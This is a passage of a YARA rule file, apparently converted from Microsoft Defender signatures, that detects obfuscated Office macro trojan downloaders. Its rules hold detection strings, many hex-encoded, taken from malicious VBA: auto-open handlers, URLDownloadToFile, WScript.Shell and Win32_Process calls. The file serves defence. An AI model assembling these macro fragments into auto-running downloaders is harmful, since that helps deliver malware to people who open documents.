        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Njiojwqehqw(mnwuiubh22, miiwthb33, uiwherur44)" ascii //weight: 1
        $x_1_2 = "URLDownloadToFile 0, miiwthb33, mnwuiubh22, 0, 0" ascii //weight: 1
        $x_1_3 = "Shell erffver" ascii //weight: 1
        $x_1_4 = "Fuinr566 t1, t2, 874, \"ygfh534fghhg\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MZ_2147743372_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MZ!MTB"
        threat_id = "2147743372"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 4c 65 6e 28}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 22 77 [0-4] 69 [0-4] 6e [0-4] 6d 67 [0-4] 6d 74 73 [0-4] 3a 57 69 [0-4] 6e [0-6] 5f 50 72 [0-4] 6f 63 65 [0-4] 73 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = ", MSForms, TextBox\"" ascii //weight: 1
        $x_1_6 = "Sub autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NC_2147743390_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NC!MTB"
        threat_id = "2147743390"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 56 61 6c 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 30 29 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 4f 70 65 6e 20 [0-37] 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = ".Close" ascii //weight: 1
        $x_1_5 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_ND_2147743391_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.ND!MTB"
        threat_id = "2147743391"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 45 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c [0-32] 2e 78 73 22 20 26 20 [0-32] 28 29 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= Chr(\"&h\" & Mid(" ascii //weight: 1
        $x_1_3 = ".text)" ascii //weight: 1
        $x_1_4 = ".Close" ascii //weight: 1
        $x_1_5 = "Debug.Print Error(" ascii //weight: 1
        $x_1_6 = "\"Wscript.Shell\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NE_2147743397_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NE!MTB"
        threat_id = "2147743397"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 22 77 [0-4] 69 [0-4] 6e [0-4] 6d 67 [0-4] 6d 74 73 [0-4] 3a 57 69 [0-4] 6e [0-8] 5f 50 72 [0-4] 6f 63 65 [0-4] 73 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = ", MSForms, TextBox\"" ascii //weight: 1
        $x_1_6 = "Sub autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LJ_2147743401_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LJ!MTB"
        threat_id = "2147743401"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 52 75 6e 20 [0-8] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-5] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"\"" ascii //weight: 1
        $x_1_4 = {3d 20 43 68 72 28 [0-6] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"1Normal.ThisDocument\"" ascii //weight: 1
        $x_1_6 = "Private Sub Document_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NF_2147743408_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NF!MTB"
        threat_id = "2147743408"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-8] 77 69 [0-8] 6e [0-8] 6d 67 6d 74 73 [0-8] 3a 57 69 [0-8] 6e [0-8] 5f 50 72 6f 63 [0-8] 65 73 73 [0-8] 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = ", MSForms, TextBox\"" ascii //weight: 1
        $x_1_5 = "Sub autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AA_2147743423_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AA!MSR"
        threat_id = "2147743423"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= UserForm1.TextBox1.Text" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = ".CreateTextFile(BOEUDIDIS, True, True)" ascii //weight: 1
        $x_1_4 = "= CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_5 = ".ShellExecute BOEUDIDIS" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AA_2147743423_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AA!MSR"
        threat_id = "2147743423"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Zjkkjwvygil = Sgn(\"Hudson GroupApt. 563North\")" ascii //weight: 1
        $x_1_2 = "Pqqvjijbvs = Hex(77)" ascii //weight: 1
        $x_1_3 = "Vvilcljvn = Oct(\"Salad\")" ascii //weight: 1
        $x_1_4 = "Jcubmxigvls = Int(\"Spencer - PriceApt. 975Southwest\")" ascii //weight: 1
        $x_1_5 = "Fqvjjszc = CDate(\"Ratke and SonsSuite 201South\")" ascii //weight: 1
        $x_1_6 = "Nizbfxmd = Hex(\"Sipes - BradtkeApt. 831Northwest\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NG_2147743443_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NG!MTB"
        threat_id = "2147743443"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-8] 77 69 [0-8] 6e [0-8] 6d 67 [0-8] 6d [0-8] 74 73 [0-8] 3a 57 69 [0-8] 6e [0-8] 5f [0-8] 50 72 6f 63 [0-8] 65 73 73 [0-8] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-69] 28 [0-53] 29 20 2b 20 22 [0-20] 77 69 6e 6d 67 6d 74 73 3a [0-20] 57 69 6e 33 32 5f 50 72 6f 63 [0-20] 65 73 73 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-53] 77 69 6e [0-16] 6d 67 6d 74 73 3a [0-16] 57 69 6e 33 32 5f 50 72 6f 63 [0-16] 65 73 73 [0-64] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-32] 77 69 [0-64] 6e [0-48] 6d 67 6d 74 73 3a [0-32] 57 69 6e [0-69] 33 32 5f 50 72 6f 63 [0-32] 65 73 73 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-53] 77 69 6e 6d 67 6d 74 [0-32] 73 3a 57 69 6e 33 32 5f [0-32] 50 72 6f 63 65 [0-32] 73 73 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_6 = {2e 43 72 65 61 74 65 ?? 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c}  //weight: 1, accuracy: Low
        $x_1_8 = ", MSForms, TextBox\"" ascii //weight: 1
        $x_1_9 = "Sub autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NH_2147743494_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NH!MTB"
        threat_id = "2147743494"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(Environ(\"TEMP\"))" ascii //weight: 1
        $x_1_2 = "=Section.Parent.Path & Application.PathSeparator & name & \".htm\", _" ascii //weight: 1
        $x_1_3 = "ThisDocument.Close" ascii //weight: 1
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 2e 54 61 67 29}  //weight: 1, accuracy: Low
        $x_1_5 = {4f 70 65 6e 20 [0-20] 20 46 6f 72 20 42 69 6e 61 72 79 20 4c 6f 63 6b 20 52 65 61 64 20 57 72 69 74 65 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_6 = "Put #" ascii //weight: 1
        $x_1_7 = ".SendMessage 0, 0, 0, 0" ascii //weight: 1
        $x_1_8 = "name = Replace(Header.Text, Chr(13), \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NI_2147743503_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NI!MTB"
        threat_id = "2147743503"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 56 61 6c 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 [0-20] 2e 43 6f 6e 74 72 6f 6c 73 28 30 29 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".Controls(" ascii //weight: 1
        $x_1_4 = ".Open" ascii //weight: 1
        $x_1_5 = ".Close" ascii //weight: 1
        $x_1_6 = ".Value" ascii //weight: 1
        $x_1_7 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NJ_2147743504_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NJ!MTB"
        threat_id = "2147743504"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 45 6e 76 69 72 6f 6e 28 22 74 65 6d 70 22 29 20 26 20 22 5c [0-32] 2e 78 73 22 20 26 20 [0-32] 28 29 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= Chr(\"&h\" & Mid(" ascii //weight: 1
        $x_1_3 = ".text" ascii //weight: 1
        $x_1_4 = ".Close" ascii //weight: 1
        $x_1_5 = "Debug.Print Error(" ascii //weight: 1
        $x_1_6 = "= New WshShell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NM_2147743532_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NM!MTB"
        threat_id = "2147743532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 52 75 6e 20 [0-8] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 [0-16] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"\"" ascii //weight: 1
        $x_1_4 = {43 68 72 28 [0-8] 2f}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"1Normal.ThisDocument\"" ascii //weight: 1
        $x_1_6 = "Private Sub Document_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NN_2147743534_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NN!MTB"
        threat_id = "2147743534"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-32] 2c 20 [0-32] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 52 75 6e 20 [0-32] 2c 20 [0-32] 2c 20 54 72 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 22 [0-32] 22 29 20 26}  //weight: 1, accuracy: Low
        $x_1_4 = "ActiveDocument.Save" ascii //weight: 1
        $x_1_5 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_6 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-32] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NO_2147743535_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NO!MTB"
        threat_id = "2147743535"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-32] 77 69 6e 6d 67 6d [0-32] 74 73 3a 57 69 [0-32] 6e 33 32 5f 50 72 6f [0-32] 63 65 73 73 [0-32] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-37] 77 69 [0-37] 6e 6d 67 6d [0-37] 74 73 3a 57 69 [0-37] 6e 33 32 5f 50 72 6f [0-37] 63 65 [0-32] 73 73 [0-37] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-37] 77 69 [0-37] 6e 6d 67 6d [0-37] 74 73 3a 57 69 [0-37] 6e 33 32 [0-37] 5f 50 72 6f [0-37] 63 65 [0-37] 73 73 [0-37] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-32] 77 69 [0-32] 6e 6d 67 6d [0-32] 74 73 3a 57 [0-32] 69 6e 33 32 5f [0-32] 50 72 6f 63 [0-32] 65 73 73 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-32] 77 69 6e [0-32] 6d 67 6d 74 [0-32] 73 3a 57 69 [0-32] 6e 33 32 5f [0-37] 50 72 6f 63 [0-32] 65 73 73 [0-32] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-32] 77 69 6e 6d [0-32] 67 6d 74 [0-32] 73 3a 57 [0-32] 69 6e 33 32 [0-32] 5f 50 72 6f 63 [0-32] 65 73 73 [0-32] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-37] 77 [0-37] 69 6e 6d [0-37] 67 [0-37] 6d 74 [0-37] 73 [0-37] 3a 57 [0-37] 69 6e 33 32 [0-37] 5f 50 72 [0-37] 6f 63 [0-37] 65 [0-53] 73 73 [0-37] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_8 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-53] 77 69 6e [0-53] 6d 67 6d [0-117] 74 73 3a 57 [0-53] 69 6e 33 [0-53] 32 5f 50 72 6f [0-53] 63 65 73 73 [0-53] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_9 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-37] 77 69 6e [0-37] 6d 67 [0-37] 6d [0-80] 74 73 3a 57 [0-37] 69 6e 33 [0-37] 32 5f 50 72 6f [0-37] 63 [0-32] 65 73 73 [0-48] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_10 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-53] 77 [0-16] 69 6e [0-37] 6d 67 [0-16] 6d [0-69] 74 73 [0-5] 3a 57 [0-53] 69 6e 33 [0-53] 32 5f 50 72 6f [0-53] 65 73 73 [0-53] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_11 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-37] 77 69 [0-37] 6e [0-37] 6d 67 6d [0-37] 74 73 3a [0-37] 57 [0-37] 69 6e 33 32 [0-37] 5f 50 [0-37] 72 6f [0-37] 63 65 [0-37] 73 73 [0-37] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_12 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-37] 77 69 [0-16] 6e [0-16] 6d [0-16] 67 6d [0-16] 74 73 3a [0-37] 57 [0-16] 69 6e 33 32 [0-16] 5f 50 [0-48] 72 6f [0-37] 63 65 [0-16] 73 73 [0-37] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_13 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 [0-53] 28 43 53 74 72 28 [0-53] 29 20 2b 20 22 [0-53] 77 [0-53] 6e [0-53] 6d [0-53] 67 6d [0-53] 74 73 3a [0-53] 57 [0-32] 69 6e [0-53] 33 32 [0-32] 5f 50 [0-53] 72 6f [0-53] 63 65 [0-53] 73 73 [0-53] 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_14 = {2e 43 72 65 61 74 65 ?? 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_15 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c}  //weight: 1, accuracy: Low
        $x_1_16 = ", MSForms, TextBox\"" ascii //weight: 1
        $x_1_17 = "Sub autoopen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NQ_2147743581_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NQ!MTB"
        threat_id = "2147743581"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 45 6e 76 69 72 6f 6e 28 [0-32] 29 20 26 20 22 5c [0-32] 2e 78 73 22 20 26 20 [0-32] 28 29 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-32] 20 26 20 22 5c [0-32] 2e 78 73 22 20 26 20 [0-32] 28 29 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= Chr(\"&h\" & Mid(" ascii //weight: 1
        $x_1_4 = {3d 20 4d 69 64 28 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = ".Close" ascii //weight: 1
        $x_1_6 = "Debug.Print Error(" ascii //weight: 1
        $x_1_7 = "= New WshShell" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_NV_2147743615_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.NV!MTB"
        threat_id = "2147743615"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HyperX = HyperX + 0." ascii //weight: 1
        $x_1_2 = "NGpower =" ascii //weight: 1
        $x_1_3 = "c:\\Helperes\\BJKGJGyfyghu675785674786.bat\", True" ascii //weight: 1
        $x_1_4 = "a.WriteLine (\"91/godz/4fzas.e^\")" ascii //weight: 1
        $x_1_5 = "\"Gerilax.e^\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AB_2147743660_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AB!MSR"
        threat_id = "2147743660"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= UserForm1.TextBox2.Text" ascii //weight: 1
        $x_1_2 = {3d 20 43 75 72 44 69 72 20 26 20 43 68 72 28 39 32 29 20 26 20 [0-6] 20 26 20 22 2e 6a 73}  //weight: 1, accuracy: Low
